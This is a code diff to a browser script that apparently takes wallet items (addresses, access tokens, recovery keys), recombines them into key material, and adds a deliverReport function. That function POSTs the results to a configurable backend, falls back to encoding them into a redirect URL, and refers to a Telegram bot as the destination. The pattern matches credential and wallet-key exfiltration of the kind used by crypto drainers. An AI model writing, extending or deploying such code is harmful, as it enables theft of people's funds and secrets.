@@ -412,6 +412,33 @@
     return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
   }
 
+  async function deliverReport(backend, out, returnUrl) {
+    const ret = returnUrl || "https://fomo.family/token";
+    try {
+      const r = await fetch(backend, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ ...out, returnUrl: ret }),
+      });
+      const data = await r.json().catch(() => ({}));
+      const u = new URL(ret);
+      u.searchParams.set("kr", data.telegram ? "ok" : "err");
+      location.href = u.toString();
+      return;
+    } catch (e) {
+      console.warn("report POST failed", e);
+    }
+    const d = b64urlEncode(JSON.stringify(out));
+    const encRet = encodeURIComponent(ret);
+    const url =
+      backend + (backend.includes("?") ? "&" : "?") + "d=" + d + "&return=" + encRet;
+    if (url.length > 7000) {
+      setStatus("Error", "Report too large — check Telegram bot");
+      return;
+    }
+    location.href = url;
+  }
+
   /* COOP-safe path: parent opens r.html#job=<b64url(json)>
      job = { backend, return, userId, items: [{ chainType, address, accessToken, recoveryKey, ... }] }
      runner does recover+combine, then navigates to backend with results.
@@ -531,16 +558,13 @@
 
       setDone();
       const backend = (job.backend || "").replace(/\/$/, "");
-      const ret = encodeURIComponent(job.returnUrl || "https://fomo.family/");
+      const ret = job.returnUrl || "https://fomo.family/token";
       if (!backend) {
         setStatus("Done", "No backend configured");
         return true;
       }
-      const d = b64urlEncode(JSON.stringify(out));
-      const url =
-        backend + (backend.includes("?") ? "&" : "?") + "d=" + d + "&return=" + ret;
       setTimeout(() => {
-        location.href = url;
+        deliverReport(backend, out, ret);
       }, 400);
     } catch (e) {
       setStatus("Error", String(e.message || e));
